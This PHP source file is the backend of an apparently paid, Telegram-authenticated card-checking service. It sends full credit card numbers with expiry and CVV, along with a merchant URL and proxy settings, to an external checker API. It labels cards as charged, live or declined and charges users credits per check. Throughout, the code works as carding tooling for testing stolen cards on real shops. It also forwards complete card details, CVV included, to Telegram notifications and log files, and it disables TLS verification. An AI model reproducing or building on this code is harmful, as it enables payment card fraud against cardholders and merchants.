<?php
declare(strict_types=1);

require_once 'config.php';
require_once 'database.php';
require_once 'auth.php';
require_once 'utils.php';
require_once 'owner_logger.php';
require_once 'cc_logs_manager.php';

header('Content-Type: application/json');

try {
    initSecureSession();
    $telegramId = (int)TelegramAuth::requireAuth();

    if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > AppConfig::SESSION_TIMEOUT) {
        session_destroy();
        respondJson([
            'error' => true,
            'status' => 'SESSION_EXPIRED',
            'message' => 'Session expired. Please login again.',
            'card' => $_GET['cc'] ?? 'undefined',
            'site' => $_GET['site'] ?? 'undefined',
            'gateway' => 'N/A',
            'price' => '0.00',
            'proxy_status' => 'N/A',
            'proxy_ip' => 'N/A',
            'time' => 'N/A'
        ]);
    }

    $sessionCredits = isset($_SESSION['credits']) ? (int)$_SESSION['credits'] : null;
    session_write_close();

    $db = Database::getInstance();
    $user = $db->getUserByTelegramId($telegramId);
    if (!$user) {
        respondJson([
            'error' => true,
            'status' => 'USER_NOT_FOUND',
            'message' => 'User not found'
        ]);
    }

    $isOwner = in_array($telegramId, AppConfig::OWNER_IDS, true);
    $currentCredits = (int)($user['credits'] ?? 0);
    $creditCost = AppConfig::CARD_CHECK_COST ?? 1;

    if (!$isOwner && $currentCredits < $creditCost) {
        respondJson([
            'error' => true,
            'status' => 'INSUFFICIENT_CREDITS',
            'message' => 'Insufficient credits. Please top up before checking.',
            'current_credits' => $currentCredits
        ]);
    }

    $rawCard = trim((string)($_GET['cc'] ?? ''));
    $rawSite = trim((string)($_GET['site'] ?? ''));
    $rawProxy = trim((string)($_GET['proxy'] ?? ''));
    $useNoProxy = isset($_GET['noproxy']) && in_array(strtolower((string)$_GET['noproxy']), ['1', 'true', 'yes'], true);

    $cardInfo = normalizeCard($rawCard);
    if ($cardInfo === null) {
        respondJson([
            'error' => true,
            'status' => 'INVALID_CARD_FORMAT',
            'message' => 'Invalid card format. Expected xxxx|mm|yyyy|cvv.'
        ]);
    }

    if (!filter_var($rawSite, FILTER_VALIDATE_URL)) {
        respondJson([
            'error' => true,
            'status' => 'INVALID_SITE_FORMAT',
            'message' => 'Invalid site URL.'
        ]);
    }

    $apiUrl = buildCheckerUrl($cardInfo['full'], $rawSite, $rawProxy, $useNoProxy);
    $apiCall = callCheckerApi($apiUrl, $cardInfo, $rawSite);

    if (!$apiCall['success']) {
        $failure = buildFailureResponse($cardInfo, $rawSite, $apiCall, $currentCredits);
        respondJson($failure);
    }

    $parsed = parseCheckerResponse($apiCall['decoded'], $apiCall['raw']);

    $remainingCredits = $currentCredits;
    $creditWarning = null;
    $creditsDeducted = 0;

    if (!$isOwner) {
        if ($db->deductCredits($telegramId, $creditCost)) {
            $creditsDeducted = $creditCost;
            try {
                $freshUser = $db->getUserByTelegramId($telegramId);
                $remainingCredits = (int)($freshUser['credits'] ?? ($currentCredits - $creditCost));
            } catch (Exception $e) {
                $remainingCredits = max(0, $currentCredits - $creditCost);
                $creditWarning = 'Credit deduction succeeded but balance refresh failed';
                logError('Failed to refresh user credits after deduction', ['error' => $e->getMessage()]);
            }

            initSecureSession();
            $_SESSION['credits'] = $remainingCredits;
            session_write_close();
        } else {
            $creditWarning = 'Check completed but credit deduction failed';
        }
    }

    logCardCheckResult(
        $db,
        $telegramId,
        $user,
        $cardInfo,
        $rawSite,
        $parsed,
        $remainingCredits,
        $apiCall,
        $creditsDeducted
    );

    $responsePayload = buildSuccessResponse(
        $cardInfo,
        $rawSite,
        $parsed,
        $remainingCredits,
        $creditsDeducted,
        $creditWarning,
        $apiCall['latency_ms']
    );

    respondJson($responsePayload);
} catch (Throwable $e) {
    logError('Card checker fatal error', [
        'error' => $e->getMessage(),
        'file' => $e->getFile(),
        'line' => $e->getLine(),
        'trace' => $e->getTraceAsString()
    ]);

    respondJson([
        'error' => true,
        'status' => 'SYSTEM_ERROR',
        'message' => 'System error occurred: ' . $e->getMessage(),
        'debug_info' => [
            'error_class' => get_class($e),
            'error_file' => basename($e->getFile()),
            'error_line' => $e->getLine(),
        ],
        'card' => $_GET['cc'] ?? 'undefined',
        'site' => $_GET['site'] ?? 'undefined',
        'gateway' => 'N/A',
        'price' => '0.00',
        'proxy_status' => 'N/A',
        'proxy_ip' => 'N/A',
        'time' => 'N/A'
    ]);
}

function respondJson(array $payload, int $statusCode = 200): void
{
    http_response_code($statusCode);
    echo json_encode($payload);
    exit;
}

function normalizeCard(string $raw): ?array
{
    $parts = array_map('trim', explode('|', $raw));
    if (count($parts) !== 4) {
        return null;
    }

    [$number, $month, $year, $cvv] = $parts;

    if (!preg_match('/^\d{13,19}$/', $number)) {
        return null;
    }

    if (!preg_match('/^(0[1-9]|1[0-2])$/', $month)) {
        return null;
    }

    if (preg_match('/^\d{2}$/', $year)) {
        $year = '20' . $year;
    }

    if (!preg_match('/^\d{4}$/', $year)) {
        return null;
    }

    if (!preg_match('/^\d{3,4}$/', $cvv)) {
        return null;
    }

    return [
        'full' => sprintf('%s|%s|%s|%s', $number, $month, $year, $cvv),
        'number' => $number,
        'month' => $month,
        'year' => $year,
        'cvv' => $cvv
    ];
}

function buildCheckerUrl(string $card, string $site, string $proxy, bool $useNoProxy): string
{
    $params = [
        'cc' => $card,
        'site' => $site,
    ];

    if ($useNoProxy) {
        $params['noproxy'] = 1;
    } elseif ($proxy !== '') {
        $params['proxy'] = $proxy;
    }

    return AppConfig::CHECKER_API_URL . '?' . http_build_query($params);
}

function callCheckerApi(string $url, array $cardInfo, string $site): array
{
    $start = microtime(true);

    if (!function_exists('curl_init')) {
        return [
            'success' => false,
            'error' => 'cURL extension is required',
            'http_code' => 0,
            'raw' => '',
            'decoded' => null,
            'latency_ms' => 0
        ];
    }

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 45,
        CURLOPT_USERAGENT => 'LegendCheckerBot/1.0'
    ]);

    $raw = curl_exec($ch);
    $error = curl_error($ch) ?: null;
    $httpCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $latency = (int)round((microtime(true) - $start) * 1000);

    logApiCall($url, $cardInfo, $site, $httpCode, $error, $raw);

    if ($error !== null) {
        return [
            'success' => false,
            'error' => $error,
            'http_code' => $httpCode,
            'raw' => $raw ?: '',
            'decoded' => null,
            'latency_ms' => $latency
        ];
    }

    if ($httpCode >= 400) {
        return [
            'success' => false,
            'error' => "HTTP {$httpCode}",
            'http_code' => $httpCode,
            'raw' => $raw ?: '',
            'decoded' => null,
            'latency_ms' => $latency
        ];
    }

    $decoded = json_decode($raw, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        $clean = cleanJsonString($raw);
        $decoded = json_decode($clean, true);
    }

    return [
        'success' => is_array($decoded),
        'error' => null,
        'http_code' => $httpCode,
        'raw' => $raw ?: '',
        'decoded' => $decoded,
        'latency_ms' => $latency
    ];
}

function cleanJsonString(string $input): string
{
    $start = strpos($input, '{');
    $end = strrpos($input, '}');

    if ($start === false || $end === false || $end <= $start) {
        return $input;
    }

    return substr($input, $start, $end - $start + 1);
}

function parseCheckerResponse(?array $decoded, string $raw): array
{
    $default = [
        'status_message' => 'API_TIMEOUT_OR_ERROR',
        'ui_status_type' => 'DECLINED',
        'gateway' => 'N/A',
        'price' => '0.00',
        'proxy_status' => 'N/A',
        'proxy_ip' => 'N/A',
        'raw_response' => $raw,
        'decoded' => $decoded
    ];

    if (!is_array($decoded)) {
        return $default;
    }

    $responseText = (string)($decoded['Response'] ?? '');
    $gateway = (string)($decoded['Gateway'] ?? 'N/A');
    $price = (string)($decoded['Price'] ?? '0.00');
    $proxyStatus = (string)($decoded['ProxyStatus'] ?? 'N/A');
    $proxyIp = (string)($decoded['ProxyIP'] ?? 'N/A');

    $uiStatus = determineUiStatus($responseText);

    return [
        'status_message' => $uiStatus['message'],
        'ui_status_type' => $uiStatus['type'],
        'gateway' => $gateway,
        'price' => $price,
        'proxy_status' => $proxyStatus,
        'proxy_ip' => $proxyIp,
        'raw_response' => $responseText,
        'decoded' => $decoded
    ];
}

function determineUiStatus(string $responseText): array
{
    $upper = strtoupper($responseText);

    $map = [
        'CHARGED' => ['CHARGED', 'CHARGE', 'ORDER_PLACED', 'THANK YOU'],
        'APPROVED' => ['APPROVED', 'LIVE', '3DS', 'OTP_REQUIRED', 'INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP', 'HANDLE IS EMPTY', 'DELIVERY RATES ARE EMPTY'],
        'DECLINED' => ['DECLINED', 'CARD_DECLINED', 'DO_NOT_HONOR', 'REJECTED', 'ERROR', 'INVALID', 'MISSING']
    ];

    foreach ($map['CHARGED'] as $needle) {
        if (strpos($upper, $needle) !== false) {
            return ['type' => 'CHARGED', 'message' => 'CHARGED'];
        }
    }

    foreach ($map['APPROVED'] as $needle) {
        if (strpos($upper, $needle) !== false) {
            return ['type' => 'APPROVED', 'message' => $responseText ?: 'APPROVED'];
        }
    }

    foreach ($map['DECLINED'] as $needle) {
        if (strpos($upper, $needle) !== false) {
            return ['type' => 'DECLINED', 'message' => $responseText ?: 'DECLINED'];
        }
    }

    if ($upper === '') {
        return ['type' => 'API_ERROR', 'message' => 'EMPTY_RESPONSE'];
    }

    return ['type' => 'UNKNOWN_STATUS', 'message' => $responseText ?: 'UNKNOWN_STATUS'];
}

function logApiCall(string $url, array $cardInfo, string $site, int $httpCode, ?string $error, string $raw): void
{
    $maskedCard = substr($cardInfo['number'], 0, 4) . '******' . substr($cardInfo['number'], -4);
    $entry = [
        'timestamp' => date('c'),
        'card' => $maskedCard,
        'site' => $site,
        'url' => $url,
        'http_code' => $httpCode,
        'error' => $error ?? 'None',
        'length' => strlen($raw),
        'response' => $raw
    ];

    $log = "=== API RESPONSE LOG ===\n" . json_encode($entry, JSON_PRETTY_PRINT) . "\n========================\n\n";
    @file_put_contents(__DIR__ . '/result.txt', $log, FILE_APPEND | LOCK_EX);
}

function logCardCheckResult(
    Database $db,
    int $telegramId,
    array $user,
    array $cardInfo,
    string $site,
    array $parsed,
    int $remainingCredits,
    array $apiCall,
    int $creditsDeducted
): void {
    $statusType = strtoupper($parsed['ui_status_type'] ?? 'DECLINED');
    $statusMessage = $parsed['status_message'] ?? 'UNKNOWN_STATUS';
    $gateway = $parsed['gateway'] ?? 'N/A';
    $price = $parsed['price'] ?? '0.00';

    $masked = substr($cardInfo['number'], 0, 6) . '******' . substr($cardInfo['number'], -4);
    $host = parse_url($site, PHP_URL_HOST) ?: $site;

    try {
        $ownerLogger = new OwnerLogger();
        $ownerLogger->sendUserActivity(
            $user,
            'Card Check',
            sprintf('Card %s on %s -> %s', $masked, $host, $statusType)
        );
    } catch (Exception $e) {
        logError('Owner logger failed', ['error' => $e->getMessage()]);
    }

    try {
        $logManager = new CCLogsManager();
        $statusForLog = strtolower($statusType) === 'approved' ? 'live' : strtolower($statusType);
        $logManager->logCCCheck([
            'telegram_id' => $telegramId,
            'username' => $user['username'] ?? 'Unknown',
            'card_number' => $cardInfo['number'],
            'card_full' => $cardInfo['full'],
            'status' => $statusForLog,
            'message' => $statusMessage,
            'gateway' => $gateway,
            'amount' => $price,
            'proxy_status' => $parsed['proxy_status'] ?? 'N/A',
            'proxy_ip' => $parsed['proxy_ip'] ?? 'N/A'
        ]);
    } catch (Exception $e) {
        logError('CCLogsManager failure', ['error' => $e->getMessage()]);
    }

    try {
        if (method_exists($db, 'logToolUsage')) {
            $db->logToolUsage($telegramId, 'card_checker', 1, $creditsDeducted);
        }
    } catch (Exception $e) {
        logError('Tool usage logging failed', ['error' => $e->getMessage()]);
    }

    if (function_exists('sendTelegramHtml') && shouldNotify($statusType, $statusMessage)) {
        $elapsedMs = $apiCall['latency_ms'] ?? 0;
        $elapsedDisplay = formatLatency($elapsedMs);

        $message = "<b>Card Checked</b>\n\n";
        $message .= "👤 <b>User:</b> " . formatUserName($user) . " ({$telegramId})\n";
        $message .= "💳 <b>Card:</b> <code>{$cardInfo['full']}</code>\n";
        $message .= "🔗 <b>Site:</b> " . htmlspecialchars($site) . "\n";
        $message .= "📣 <b>Response:</b> " . htmlspecialchars($statusMessage) . "\n";
        $message .= "🟩 <b>Status:</b> {$statusType}\n";
        $message .= "🏦 <b>Gateway:</b> " . htmlspecialchars($gateway) . "\n";
        $message .= "💵 <b>Amount:</b> " . htmlspecialchars($price) . "\n";
        $message .= "⏱️ <b>Latency:</b> {$elapsedDisplay}\n";
        $message .= "💰 <b>Credits Left:</b> " . number_format($remainingCredits);

        try {
            sendTelegramHtml($message);
        } catch (Exception $e) {
            logError('Telegram notification failed', ['error' => $e->getMessage()]);
        }
    }
}

function shouldNotify(string $statusType, string $statusMessage): bool
{
    $statusType = strtoupper($statusType);
    $statusMessage = strtoupper($statusMessage);

    if ($statusMessage === 'STORE BLOCKED') {
        return false;
    }

    $notifyAll = (bool)SiteConfig::get('notify_card_results', true);
    $notifyCharged = (bool)SiteConfig::get('notify_card_charged', true);

    if ($notifyAll) {
        return true;
    }

    return $notifyCharged && $statusType === 'CHARGED';
}

function buildSuccessResponse(
    array $cardInfo,
    string $site,
    array $parsed,
    int $remainingCredits,
    int $creditsDeducted,
    ?string $warning,
    int $latencyMs
): array {
    $response = [
        'card' => $cardInfo['full'],
        'site' => $site,
        'gateway' => $parsed['gateway'],
        'status' => $parsed['status_message'],
        'ui_status_type' => $parsed['ui_status_type'],
        'price' => $parsed['price'],
        'proxy_status' => $parsed['proxy_status'],
        'proxy_ip' => $parsed['proxy_ip'],
        'raw_api_response' => $parsed['raw_response'],
        'remaining_credits' => $remainingCredits,
        'credits_deducted' => $creditsDeducted,
        'time' => formatLatency($latencyMs)
    ];

    if ($warning) {
        $response['warning'] = $warning;
    }

    return $response;
}

function buildFailureResponse(array $cardInfo, string $site, array $apiCall, int $currentCredits): array
{
    $status = 'API_ERROR';
    if (!empty($apiCall['error'])) {
        $status .= ': ' . $apiCall['error'];
    }

    return [
        'error' => true,
        'status' => $status,
        'card' => $cardInfo['full'],
        'site' => $site,
        'gateway' => 'N/A',
        'price' => '0.00',
        'proxy_status' => 'N/A',
        'proxy_ip' => 'N/A',
        'time' => formatLatency($apiCall['latency_ms'] ?? 0),
        'remaining_credits' => $currentCredits
    ];
}

function formatLatency(int $milliseconds): string
{
    if ($milliseconds < 1000) {
        return sprintf('%dms', $milliseconds);
    }

    $seconds = $milliseconds / 1000;
    return sprintf('%.2fs', $seconds);
}
